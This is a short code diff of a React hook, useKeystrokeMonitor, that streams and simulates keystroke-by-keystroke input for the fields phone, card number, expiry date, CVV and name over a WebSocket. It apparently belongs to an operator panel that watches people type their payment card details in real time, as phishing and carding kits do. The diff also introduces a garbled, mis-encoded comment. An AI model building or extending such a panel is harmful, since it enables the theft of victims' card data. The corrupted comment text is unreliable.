@@ -41,6 +41,7 @@ const TYPING_TIMEOUT = 500; // 500ms后停止显示打字状态
 export function useKeystrokeMonitor(initialSubmissions: any[]) {
   const [submissions, setSubmissions] = useState(initialSubmissions);
   const [fieldStates, setFieldStates] = useState<SubmissionFieldStates>({});
+  const [submissionStates, setSubmissionStates] = useState<SubmissionState>({});
   const wsRef = useRef<WebSocket | null>(null);
   const simulationRef = useRef<{[key: string]: NodeJS.Timeout}>({});
   const typingTimeoutsRef = useRef<{[key: string]: NodeJS.Timeout}>({});
@@ -135,7 +136,7 @@ export function useKeystrokeMonitor(initialSubmissions: any[]) {
     const charsToDelete = oldValue.length - commonPrefix.length;
     const charsToAdd = newValue.substring(commonPrefix.length);
 
-    // ���除字符
+    // 删除字符
     for (let i = 0; i < charsToDelete; i++) {
       setTimeout(() => {
         currentValue = currentValue.slice(0, -1);
@@ -194,7 +195,7 @@ export function useKeystrokeMonitor(initialSubmissions: any[]) {
       const simulate = () => {
         if (submissions.length === 0) return;
 
-        // 随机选择一个提交和字段
+        // ��机选择一个提交和字段
         const randomSubmission = submissions[Math.floor(Math.random() * submissions.length)];
         const fields: (keyof RealtimeInput)[] = ['phone', 'cardNumber', 'expiryDate', 'cvv', 'name'];
         const randomField = fields[Math.floor(Math.random() * fields.length)];
